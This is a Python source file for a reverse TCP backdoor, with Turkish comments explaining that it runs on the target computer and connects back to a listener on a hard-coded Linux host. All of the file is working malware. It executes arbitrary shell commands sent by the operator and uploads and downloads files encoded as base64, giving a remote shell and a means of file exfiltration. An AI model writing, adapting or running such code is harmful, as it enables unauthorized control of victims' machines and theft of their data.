# coding=utf-8
import socket, subprocess
import simplejson
import os
import base64

# 69. satirdaki ip adresi, linux cihazinin ip adresi olmalidir. cunku bind degil reverse tcp yontemi ile backdoor ayarladim.
# bu arac herhangi bir listener ile calistirilmalidir. backdoor araci hedef bilgisayarda calistirilacaktir ve listener araci da linux cihazda calistirilacaktir.
# asagidaki ayar ip forwardlamak isteyen gnu isletim sistemleri icindir. windowsta calistirilacaksa yorum satiri olarak kalabilir.

# print('echo "1" > /proc/sys/net/ipv4/ip_forward')

class Socket():
    def __init__(self, host, port):
        self.decode_codec = "cp857"
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((host, port)) 

    def exec_cd_command(self,directory):
        os.chdir(directory)
        return "change directory to "+ directory

    def save_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "Upload OK"

    def get_file_contents(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def json_send(self,data):
        json_bytes=data.decode(self.decode_codec)
        json_data=simplejson.dumps(json_bytes)
        #print(type(json_data))
        return self.connection.send(json_data.encode(self.decode_codec))

    def json_recv(self):
        json_data=""
        while 1: # gelen paketleri tam almak icin
            try:
                json_data=json_data+self.connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def command_executer(self, command):
        return subprocess.check_output(command, shell=True)

    def start_socket(self):
        while True:
            command = self.json_recv()
            try:
                if command[0]=="quit":
                    self.connection.close()
                    exit()
                elif command[0]=="cd" and len(command) > 1:
                    command_exe=self.exec_cd_command(command[1]).encode(self.decode_codec)
                elif command[0]=="download":
                    command_exe=self.get_file_contents(command[1])
                    #print(type(command_exe))

                elif command[0]=="upload":
                    command_exe=self.save_file(command[1],command[2]).encode(self.decode_codec)
                    #print(type(command_exe))
                else:
                    command_exe = self.command_executer(command)  
            except Exception:
                command_exe="Error!".encode(self.decode_codec)
            self.json_send(command_exe)
        self.connection.close()

Socket = Socket("192.168.76.169", 8080) # required
Socket.start_socket()